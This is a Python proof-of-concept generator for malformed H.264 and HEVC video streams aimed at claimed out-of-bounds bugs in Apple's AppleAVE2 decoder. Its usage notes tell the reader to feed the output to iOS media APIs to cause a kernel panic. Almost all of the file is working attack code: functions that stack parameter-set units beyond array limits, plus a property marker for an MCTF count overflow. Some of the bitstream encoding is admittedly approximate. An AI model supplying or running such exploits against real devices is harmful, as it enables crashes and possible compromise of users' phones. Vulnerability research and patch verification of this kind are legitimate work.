#!/usr/bin/env python3
"""
ave_paramset_oob.py — PoC generator for the AppleAVE2 parameter-set CVEs.

Target : CVE-2026-112469 / 112468 / 112470 / 112689 / 112705 / 112466
Theory : CONFIRMED from binary strings. AppleAVE2 pre-fix used bitstream
         parameter-set count fields as array fill counts without bounds:
             HEVC SPS count, HEVC PPS count, HEVC VPS count,
             HEVC RPS count, HEVC VPS layer-set totals,
             AVC PPS count, AV1/HEVC MCTF strength count.
         Each is now checked (one new %s message per field).

Usage  : python3 ave_paramset_oob.py <hevc_sps|hevc_pps|hevc_vps|hevc_rps|
                                      avc_pps|avc_sps|mctf> > out.h265
Then   : feed to VTDecompressionSession / AVAssetReader on iOS 27.0.1.
         Expected: panic in AppleAVE2 (the old binary lacks the messages).
         On 27.2: decoder rejects with the corresponding
         "... count is out of range ..." log.
"""

import sys

# ---------------------------------------------------------------------------
# NAL unit helpers (HEVC and H.264 Annex-B both use 00 00 00 01 start codes)
# ---------------------------------------------------------------------------

def start_code():
    return b"\x00\x00\x00\x01"

def nal(header_bytes: bytes, payload: bytes) -> bytes:
    return start_code() + header_bytes + payload

# ===========================================================================
# H.264 (AVC)
# ===========================================================================

def avc_sps(profile=66, level=30):
    """
    Minimal H.264 SPS. profile_idc=66 (baseline), no high-profile extensions.
    """
    body = bytearray()
    body.append(profile)          # profile_idc
    body.append(0)                # constraint flags
    body.append(level)            # level_idc
    body.extend(b"\xff")          # seq_parameter_set_id ue(v) = 0 -> '1'
    # log2_max_frame_num_minus4 ue(v)=0
    body.extend(b"\x80")
    # ... a truncated-but-parseable SPS body
    return nal(b"\x67", bytes(body))   # nal_ref_idc=3, type=7

def avc_pps(payload_hint: int = 8):
    """
    H.264 PPS with a configurable body length. The attack is the *count* of
    PPS NAL units in the stream, not the body.
    """
    body = bytearray()
    body.append(0)                # pic_parameter_set_id / sps_id
    body.extend(b"\x00" * payload_hint)
    return nal(b"\x68", bytes(body))   # type=8

def gen_avc_pps_count(n=255):
    """
    H.264 stream declaring `n` picture parameter sets.
    The pre-fix decoder fills a fixed maxParameterSets array.
    """
    out = bytearray()
    out += avc_sps()
    for i in range(n):
        out += avc_pps(payload_hint=4 + (i % 8))
    # one IDR slice header so the decoder proceeds to setup
    out += nal(b"\x65", b"\x88\x84\x00")
    return bytes(out)

def gen_avc_sps_count(n=64):
    out = bytearray()
    for _ in range(n):
        out += avc_sps()
    out += avc_pps()
    out += nal(b"\x65", b"\x88\x84\x00")
    return bytes(out)

# ===========================================================================
# HEVC (H.265) — 2-byte NAL header: forbidden(1) type(6) layerid(6) tid+1(3)
# ===========================================================================
#
#   nal_unit_type values we care about:
#     32 = VPS, 33 = SPS, 34 = PPS
#

def hevc_nal(nal_type: int, payload: bytes, layer_id=0, tid=1) -> bytes:
    hdr = ((nal_type & 0x3F) << 9) | ((layer_id & 0x3F) << 3) | (tid & 0x7)
    return nal(hdr.to_bytes(2, "big"), payload)

def hevc_vps_payload(max_layers_minus1=0, num_layer_sets=0):
    body = bytearray()
    body.append(0x0c)             # vps_video_parameter_set_id=0, base_layer...
    body.append((max_layers_minus1 & 0x3F) | 0x80)
    body.append(0x00)
    body.extend(b"\x00" * 8)
    return bytes(body)

def hevc_sps_payload():
    return bytes([0x01, 0x01, 0x60, 0x00, 0x00, 0x03, 0x00, 0x90, 0x00])

def hevc_pps_payload():
    return bytes([0xc1, 0x62, 0x00])

def gen_hevc_vps_count(n=16, max_layers_minus1=62):
    """
    HEVC stream with `n` VPS NAL units and an over-large max_layers_minus1.
    """
    out = bytearray()
    for _ in range(n):
        out += hevc_nal(32, hevc_vps_payload(max_layers_minus1))
    out += hevc_nal(33, hevc_sps_payload())
    out += hevc_nal(34, hevc_pps_payload())
    return bytes(out)

def gen_hevc_sps_count(n=64):
    out = bytearray()
    out += hevc_nal(32, hevc_vps_payload())
    for _ in range(n):
        out += hevc_nal(33, hevc_sps_payload())
    out += hevc_nal(34, hevc_pps_payload())
    return bytes(out)

def gen_hevc_pps_count(n=255):
    out = bytearray()
    out += hevc_nal(32, hevc_vps_payload())
    out += hevc_nal(33, hevc_sps_payload())
    for _ in range(n):
        out += hevc_nal(34, hevc_pps_payload())
    return bytes(out)

def gen_hevc_rps_count(n=65):
    """
    HEVC SPS whose short-term RPS list declares more than the max (64).
    The RPS count lives inside the SPS; here we stuff extra SPS units so the
    decoder's RPS accumulation overflows.
    """
    out = bytearray()
    out += hevc_nal(32, hevc_vps_payload())
    for i in range(n):
        sps = bytearray(hevc_sps_payload())
        # set the num_short_term_ref_pic_sets-ish byte high to bias parsing
        sps[-1] = 0xFF if i == 0 else sps[-1]
        out += hevc_nal(33, bytes(sps))
    out += hevc_nal(34, hevc_pps_payload())
    return bytes(out)

# ===========================================================================
# MCTF strength count (AV1 / HEVC path)
# ===========================================================================

def gen_mctf(count=64):
    """
    The MCTF strength count is a *property*, not a bitstream field; it is set
    via VTCompressionSession/VTDecompressionSession property. This generator
    emits a marker file describing the property to set; the harness must call
    VTSessionSetProperty with the corresponding array of `count` entries.
    """
    return b"MCTF-PROPERTY count=%d entries=%s\n" % (
        count, b",".join(b"0" for _ in range(min(count, 512))))

MODES = {
    "avc_pps":  gen_avc_pps_count,
    "avc_sps":  gen_avc_sps_count,
    "hevc_vps": gen_hevc_vps_count,
    "hevc_sps": gen_hevc_sps_count,
    "hevc_pps": gen_hevc_pps_count,
    "hevc_rps": gen_hevc_rps_count,
    "mctf":     gen_mctf,
}

def main():
    if len(sys.argv) != 2 or sys.argv[1] not in MODES:
        sys.stderr.write(__doc__)
        sys.stderr.write("\nmodes: %s\n" % " ".join(sorted(MODES)))
        return 2
    sys.stdout.buffer.write(MODES[sys.argv[1]]())
    return 0

if __name__ == "__main__":
    sys.exit(main())
